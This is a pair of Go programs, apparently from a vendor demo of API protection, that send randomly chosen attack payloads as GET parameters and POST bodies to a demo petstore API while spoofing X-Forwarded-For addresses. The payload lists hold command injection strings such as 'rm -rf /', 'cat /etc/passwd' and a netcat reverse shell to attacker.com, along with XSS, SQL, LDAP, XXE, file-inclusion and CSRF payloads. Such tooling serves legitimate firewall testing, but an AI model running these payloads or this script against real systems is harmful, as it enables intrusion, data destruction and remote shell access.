package main

import (
        "fmt"
        "math/rand"
        "net"
        "net/http"
        "os"
        "time"
)

func main() {
        baseURL := "http://petstore.wcfdemo.com/api/v3/pet"
        attackPayloads := []string{
                // Command Injection
                "\"; ls #",
                "\"; shutdown -h now #",
                "\"; cat /etc/passwd #",
                "\"; rm -rf / #",
                "\"; curl http://malicious.com #",
                "\"; wget http://malicious.com #",
                "\"; nc -e /bin/sh attacker.com 1234 #",
                "\"; sudo rm -rf / #",
                "\"; perl -e 'print \"Hello, world!\"' #",
                "\"; python -c 'print(\"Hello, world!\")' #",

                // XSS
                "<script>alert('XSS');</script>",
                "<img src=x onerror=alert('XSS') />",
                "<body onload=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<a href=\"javascript:alert('XSS')\">Click me</a>",
                "<embed src=\"javascript:alert('XSS')\"></embed>",
                "<object data=\"javascript:alert('XSS')\"></object>",
                "<form action=\"javascript:alert('XSS')\"></form>",
                "<marquee onstart=\"alert('XSS')\"></marquee>",

                // SQL Injection
                "1 OR 1=1",
                "'; DROP TABLE users; --",
                "admin' --",
                "admin' #",
                "admin'/*",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "') OR ('1'='1",
                "') OR ('1'='1' --",

                // LDAP Injection
                "*)(objectClass=*))",
                "admin)(&))",
                "*()|%26)",
                "*()|&",
                "*()|%26|",
                "*)(uid=*))(|(uid=*",
                "*))(|(objectclass=*)",
                "*/*",

                // XXE Injection
                "<?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>",
                "<?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY test SYSTEM \"http://attacker.com/malicious.dtd\">]><root>&test;</root>",
                "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>&xxe;</root>",
                "<foo><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com\"> ]><bar>&xxe;</bar></foo>",

                // Remote File Inclusion (RFI)
                "http://malicious.com/evil.php",
                "http://evil.com/shell.txt?",
                "//attacker.com/rfi.txt?",

                // Local File Inclusion (LFI)
                "../../../../etc/passwd",
                "../../../../../../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",

                // CSRF
                "<img src=\"http://attacker.com/csrf?user=admin&pass=1234\" />",
                "<form action=\"http://victim.com/change-password\" method=\"POST\"><input type=\"hidden\" name=\"password\" value=\"newpassword\" /><input type=\"submit\" value=\"Submit\" /></form>",
        }

        fmt.Println("-------------------------------------------------------------------------------------------------------------------")
        fmt.Printf("Sending API GET requests to %s/{value} to test for various vulnerabilities\n", baseURL)
        fmt.Println("-------------------------------------------------------------------------------------------------------------------")

        rand.Seed(time.Now().UnixNano())
        for i := 0; i < 10; i++ {
                randomIndex := rand.Intn(len(attackPayloads))
                randomValue := rand.Intn(5) + 1
                ipAddress := generateRandomIP()
                attackURL := fmt.Sprintf("%s/%d?id=%s", baseURL, randomValue, attackPayloads[randomIndex])
                fmt.Printf("GET : %s - HTTP status = ", attackURL)

                statusCode := sendGetRequest(attackURL, ipAddress)
                fmt.Println(statusCode)
        }

        fmt.Println()
}

func generateRandomIP() string {
        rand.Seed(time.Now().UnixNano())
        ip := make(net.IP, 4)
        for i := 0; i < 4; i++ {
                ip[i] = byte(rand.Intn(256))
        }
        return ip.String()
}

func sendGetRequest(url, ipAddress string) int {
        client := &http.Client{}
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
                fmt.Println("Error creating request:", err)
                os.Exit(1)
        }

        req.Header.Set("X-Forwarded-For", ipAddress)
        req.Header.Set("User-Agent", "ML-Requester")
        req.Header.Set("Accept", "application/json")

        resp, err := client.Do(req)
        if err != nil {
                fmt.Println("Error sending request:", err)
                os.Exit(1)
        }
        defer resp.Body.Close()

        return resp.StatusCode
}
fortinet@client:~/ml-api$ ls
attacks.go  get  get-attack.go  get.go  post  post-attacks  post-attacks.go  post.go  test.sh
fortinet@client:~/ml-api$ cat post-attacks.go
package main

import (
        "bytes"
        "fmt"
        "math/rand"
        "net/http"
        "os"
        "time"
)

func main() {
        url := "http://petstore.wcfdemo.com/api/v3/pet"
        attackPayloads := []string{
                `{"id": 110, "category": {"id": 110, "name": "Camel"}, "name": "FortiCamel", "photoUrls": ["Willupdatelater"], "tags": [{"id": 110, "name": "FortiCamel"}], "status": "ls;;;;;cmd.exe"}`,
                `{"id": 111, "category": {"id": 111, "name": "Dog"}, "name": "FortiDog", "photoUrls": ["Willupdatelater"], "tags": [{"id": 111, "name": "FortiDog"}], "status": "<script>alert('XSS');</script>"}`,
                `{"id": 112, "category": {"id": 112, "name": "Cat"}, "name": "FortiCat", "photoUrls": ["Willupdatelater"], "tags": [{"id": 112, "name": "FortiCat"}], "status": "1 OR 1=1"}`,
                `{"id": 113, "category": {"id": 113, "name": "Bird"}, "name": "FortiBird", "photoUrls": ["Willupdatelater"], "tags": [{"id": 113, "name": "FortiBird"}], "status": "rm -rf /"}`,
                `{"id": 114, "category": {"id": 114, "name": "Fish"}, "name": "FortiFish", "photoUrls": ["Willupdatelater"], "tags": [{"id": 114, "name": "FortiFish"}], "status": "<img src=x onerror=alert('XSS') />"}`,
                `{"id": 115, "category": {"id": 115, "name": "Turtle"}, "name": "FortiTurtle", "photoUrls": ["Willupdatelater"], "tags": [{"id": 115, "name": "FortiTurtle"}], "status": "cat /etc/passwd"}`,
                `{"id": 116, "category": {"id": 116, "name": "Hamster"}, "name": "FortiHamster", "photoUrls": ["Willupdatelater"], "tags": [{"id": 116, "name": "FortiHamster"}], "status": "' OR '1'='1'; --"}`,
                `{"id": 117, "category": {"id": 117, "name": "Rabbit"}, "name": "FortiRabbit", "photoUrls": ["Willupdatelater"], "tags": [{"id": 117, "name": "FortiRabbit"}], "status": "<iframe src=javascript:alert('XSS')></iframe>"}`,
                `{"id": 118, "category": {"id": 118, "name": "Snake"}, "name": "FortiSnake", "photoUrls": ["Willupdatelater"], "tags": [{"id": 118, "name": "FortiSnake"}], "status": "wget http://malicious.com"}`,
                `{"id": 119, "category": {"id": 119, "name": "Lizard"}, "name": "FortiLizard", "photoUrls": ["Willupdatelater"], "tags": [{"id": 119, "name": "FortiLizard"}], "status": "nc -e /bin/sh attacker.com 1234"}`,
        }

        rand.Seed(time.Now().UnixNano())

        fmt.Println("-------------------------------------------------------------------------------------------------------------------")
        fmt.Printf("Sending API POST requests to %s to test for various vulnerabilities\n", url)
        fmt.Println("-------------------------------------------------------------------------------------------------------------------")

        for i := 0; i < 10; i++ {
                randomIndex := rand.Intn(len(attackPayloads))
                payload := attackPayloads[randomIndex]

                statusCode := sendPostRequest(url, payload)
                fmt.Printf("Sent payload %d: %s - HTTP status = %d\n", i+1, payload, statusCode)
        }

        fmt.Println()
}

func sendPostRequest(url, payload string) int {
        client := &http.Client{}
        req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
        if err != nil {
                fmt.Println("Error creating request:", err)
                os.Exit(1)
        }

        req.Header.Set("accept", "application/json")
        req.Header.Set("Content-Type", "application/json")

        resp, err := client.Do(req)
        if err != nil {
                fmt.Println("Error sending request:", err)
                os.Exit(1)
        }
        defer resp.Body.Close()

        return resp.StatusCode
}
